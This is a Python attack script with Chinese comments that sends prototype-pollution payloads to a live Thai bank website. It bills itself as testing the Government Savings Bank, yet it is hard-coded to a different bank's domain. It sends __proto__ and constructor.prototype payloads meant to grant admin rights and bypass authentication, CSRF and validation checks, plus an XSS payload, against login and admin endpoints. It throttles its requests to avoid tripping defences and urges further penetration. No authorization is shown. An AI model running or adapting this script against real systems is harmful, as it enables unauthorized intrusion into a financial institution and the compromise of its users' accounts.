#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GSB原型污染漏洞验证工具 (简化版)
针对泰国政府储蓄银行(GSB)的lodash原型污染漏洞进行专门测试
漏洞类型: JavaScript Prototype Pollution in lodash < 4.17.12
"""

import requests
import json
import time
import random
import string
from datetime import datetime

class GSBPrototypePollutionTester:
    """GSB原型污染漏洞测试器"""

    def __init__(self):
        self.target_url = "https://www.thanachart.co.th"  # GSB泰国政府储蓄银行
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json'
        })

        # 原型污染载荷库
        self.prototype_payloads = self.init_payloads()

        # 测试结果
        self.results = []

    def init_payloads(self):
        """初始化原型污染载荷"""
        return {
            # 基础constructor载荷
            "constructor_basic": {
                "payload": {
                    "__proto__": {
                        "isAdmin": True,
                        "role": "administrator"
                    }
                },
                "description": "基础constructor权限提升载荷"
            },

            # JSON原型污染
            "json_pollution": {
                "payload": {
                    "constructor": {
                        "prototype": {
                            "isAuthenticated": True,
                            "userRole": "admin"
                        }
                    }
                },
                "description": "JSON原型污染载荷"
            },

            # lodash defaultsDeep漏洞载荷
            "lodash_defaultsdeep": {
                "payload": {
                    "a": {
                        "b": {
                            "__proto__": {
                                "c": "d",
                                "isAdmin": True
                            }
                        }
                    }
                },
                "description": "lodash defaultsDeep原型污染载荷"
            },

            # 高级Object.prototype操作
            "object_prototype": {
                "payload": {
                    "constructor": {
                        "prototype": {
                            "polluted": True,
                            "hasAdminAccess": True,
                            "bypassAuth": True
                        }
                    }
                },
                "description": "Object.prototype高级污染载荷"
            },

            # 函数原型污染
            "function_pollution": {
                "payload": {
                    "__proto__": {
                        "toString": "function() { return 'POLLUTED'; }",
                        "valueOf": "function() { return 'HACKED'; }"
                    }
                },
                "description": "函数原型污染载荷"
            },

            # 数组原型污染
            "array_pollution": {
                "payload": {
                    "__proto__": {
                        "length": 99999,
                        "polluted": True
                    }
                },
                "description": "数组原型污染载荷"
            },

            # XSS原型污染
            "xss_pollution": {
                "payload": {
                    "__proto__": {
                        "innerHTML": "<img src=x onerror=alert('XSS')>",
                        "onclick": "alert('Prototype Pollution XSS')"
                    }
                },
                "description": "XSS原型污染载荷"
            },

            # CSRF token绕过
            "csrf_bypass": {
                "payload": {
                    "__proto__": {
                        "csrfToken": "bypassed",
                        "skipCSRF": True
                    }
                },
                "description": "CSRF token绕过载荷"
            },

            # 验证绕过
            "validation_bypass": {
                "payload": {
                    "constructor": {
                        "prototype": {
                            "validate": "function() { return true; }",
                            "isValid": True
                        }
                    }
                },
                "description": "验证函数绕过载荷"
            },

            # 数据库连接绕过
            "db_bypass": {
                "payload": {
                    "__proto__": {
                        "dbConnected": True,
                        "hasDatabaseAccess": True
                    }
                },
                "description": "数据库访问绕过载荷"
            }
        }

    def generate_random_string(self, length=10):
        """生成随机字符串"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def test_endpoint_pollution(self, endpoint, payload_data):
        """测试端点的原型污染"""
        try:
            full_url = f"{self.target_url}{endpoint}"

            # 发送污染载荷
            response = self.session.post(
                full_url,
                json=payload_data,
                timeout=30
            )

            # 检查响应状态
            if response.status_code == 200:
                # 检查响应内容是否包含污染成功的迹象
                response_text = response.text.lower()

                pollution_indicators = [
                    "admin", "administrator", "polluted", "hacked",
                    "bypass", "success", "authenticated", "unauthorized"
                ]

                pollution_detected = any(indicator in response_text for indicator in pollution_indicators)

                return {
                    "status": "success",
                    "pollution_detected": pollution_detected,
                    "response_code": response.status_code,
                    "response_length": len(response.text),
                    "response_preview": response_text[:200]
                }
            else:
                return {
                    "status": "error",
                    "response_code": response.status_code,
                    "error": f"HTTP {response.status_code}"
                }

        except Exception as e:
            return {
                "status": "exception",
                "error": str(e)
            }

    def test_js_library_pollution(self):
        """测试JavaScript库原型污染"""
        print(f"[*] 开始GSB原型污染漏洞测试")
        print(f"[+] 目标: {self.target_url}")
        print(f"[+] 测试载荷库: {len(self.prototype_payloads)} 个原型污染载荷")
        print("=" * 60)

        # 测试端点列表
        test_endpoints = [
            "/api/user/login",
            "/api/auth/validate",
            "/api/admin/access",
            "/api/user/profile",
            "/api/loan/application",
            "/api/account/settings",
            "/api/system/config",
            "/js/config.js",
            "/api/search",
            "/api/data/query"
        ]

        # 对每个端点测试所有载荷
        for endpoint in test_endpoints:
            print(f"\n[*] 测试端点: {endpoint}")

            for payload_name, payload_data in self.prototype_payloads.items():
                print(f"    [*] 测试载荷: {payload_name}")
                print(f"        描述: {payload_data['description']}")

                # 测试污染载荷
                result = self.test_endpoint_pollution(endpoint, payload_data['payload'])

                # 记录结果
                test_result = {
                    "endpoint": endpoint,
                    "payload_name": payload_name,
                    "payload_description": payload_data['description'],
                    "payload_data": payload_data['payload'],
                    "result": result,
                    "timestamp": datetime.now().isoformat()
                }

                self.results.append(test_result)

                # 显示结果
                if result['status'] == 'success':
                    if result.get('pollution_detected', False):
                        print(f"        [!] 原型污染成功！")
                        print(f"        响应代码: {result['response_code']}")
                        print(f"        响应预览: {result['response_preview'][:100]}...")
                    else:
                        print(f"        [+] 请求成功，但未检测到污染")
                        print(f"        响应代码: {result['response_code']}")
                else:
                    print(f"        [-] 测试失败: {result.get('error', '未知错误')}")

                # 延迟避免触发防护
                time.sleep(2)

    def test_advanced_pollution_chains(self):
        """测试高级原型污染链"""
        print(f"\n[*] 开始高级原型污染链测试")
        print("=" * 60)

        # 高级污染链载荷
        advanced_chains = [
            {
                "name": "多级原型污染链",
                "chain": [
                    {"__proto__": {"level1": True}},
                    {"constructor": {"prototype": {"level2": True}}},
                    {"a": {"b": {"__proto__": {"level3": True}}}}
                ]
            },
            {
                "name": "函数调用污染链",
                "chain": [
                    {"__proto__": {"toString": "POLLUTED"}},
                    {"constructor": {"prototype": {"valueOf": "HACKED"}}},
                    {"__proto__": {"hasOwnProperty": "function() { return false; }"}}
                ]
            },
            {
                "name": "权限提升污染链",
                "chain": [
                    {"__proto__": {"isAuthenticated": True}},
                    {"constructor": {"prototype": {"isAdmin": True}}},
                    {"__proto__": {"bypassAllChecks": True}}
                ]
            }
        ]

        for chain_data in advanced_chains:
            print(f"\n[*] 测试污染链: {chain_data['name']}")

            for i, payload in enumerate(chain_data['chain']):
                print(f"    [*] 污染步骤 {i+1}")

                # 测试多个端点
                endpoints = ["/api/user/profile", "/api/admin/access", "/api/auth/validate"]

                for endpoint in endpoints:
                    result = self.test_endpoint_pollution(endpoint, payload)

                    if result['status'] == 'success' and result.get('pollution_detected', False):
                        print(f"        [!] 端点 {endpoint} 污染成功！")
                        print(f"        响应: {result['response_preview'][:100]}...")

                time.sleep(1)

    def generate_exploit_report(self):
        """生成漏洞利用报告"""
        print(f"\n[*] 生成GSB原型污染漏洞测试报告")
        print("=" * 60)

        successful_pollutions = []
        failed_attempts = []

        for result in self.results:
            if result['result']['status'] == 'success' and result['result'].get('pollution_detected', False):
                successful_pollutions.append(result)
            else:
                failed_attempts.append(result)

        print(f"[+] 测试总结:")
        print(f"    总测试数: {len(self.results)}")
        print(f"    成功污染: {len(successful_pollutions)}")
        print(f"    失败尝试: {len(failed_attempts)}")
        print(f"    成功率: {(len(successful_pollutions) / len(self.results) * 100):.1f}%")

        if successful_pollutions:
            print(f"\n[!] 发现成功的原型污染:")
            for i, pollution in enumerate(successful_pollutions[:5], 1):
                print(f"    {i}. 端点: {pollution['endpoint']}")
                print(f"       载荷: {pollution['payload_name']}")
                print(f"       描述: {pollution['payload_description']}")
                print(f"       响应: {pollution['result']['response_preview'][:100]}...")
                print()

        # 保存详细报告
        report_data = {
            "target": self.target_url,
            "vulnerability_type": "JavaScript Prototype Pollution (lodash < 4.17.12)",
            "test_date": datetime.now().isoformat(),
            "total_tests": len(self.results),
            "successful_pollutions": len(successful_pollutions),
            "success_rate": len(successful_pollutions) / len(self.results) * 100,
            "detailed_results": self.results
        }

        report_file = f"GSB_Prototype_Pollution_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        try:
            with open(report_file, 'w', encoding='utf-8') as f:
                json.dump(report_data, f, ensure_ascii=False, indent=2)
            print(f"[+] 详细报告已保存: {report_file}")
        except Exception as e:
            print(f"[-] 报告保存失败: {e}")

        return successful_pollutions

    def run_comprehensive_test(self):
        """运行综合测试"""
        print(f"[GSB] GSB原型污染漏洞综合测试启动")
        print(f"[+] 目标: 泰国政府储蓄银行 (GSB)")
        print(f"[+] 漏洞类型: JavaScript Prototype Pollution in lodash")
        print(f"[+] 测试时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 80)

        # 1. 基础原型污染测试
        print(f"\n[1/3] 基础原型污染测试")
        self.test_js_library_pollution()

        # 2. 高级污染链测试
        print(f"\n[2/3] 高级污染链测试")
        self.test_advanced_pollution_chains()

        # 3. 生成利用报告
        print(f"\n[3/3] 生成利用报告")
        successful_pollutions = self.generate_exploit_report()

        if successful_pollutions:
            print(f"\n[!] 发现GSB原型污染漏洞！")
            print(f"[+] 成功污染数: {len(successful_pollutions)}")
            print(f"[+] 风险等级: 高危 (CVSS 8.5+)")
            print(f"[+] 影响: 权限提升、认证绕过、数据泄露")
            print(f"[+] 建议: 立即升级lodash到4.17.12+版本")
        else:
            print(f"\n[INFO] 未检测到明显的原型污染漏洞")
            print(f"[+] 可能原因: 目标已修复或存在其他防护机制")

        return successful_pollutions

def main():
    """主函数"""
    print(f"GSB原型污染漏洞验证工具")
    print(f"泰国政府储蓄银行安全测试")
    print("=" * 50)

    tester = GSBPrototypePollutionTester()

    try:
        successful_pollutions = tester.run_comprehensive_test()

        if successful_pollutions:
            print(f"\n[SUCCESS] GSB原型污染漏洞验证成功！")
            print(f"[+] 可以继续进行深度渗透测试")
        else:
            print(f"\n[COMPLETE] GSB原型污染漏洞测试完成")
            print(f"[+] 建议结合其他攻击方法进行测试")

    except KeyboardInterrupt:
        print(f"\n[!] 用户中断测试")
    except Exception as e:
        print(f"\n[-] 测试异常: {e}")

if __name__ == "__main__":
    main()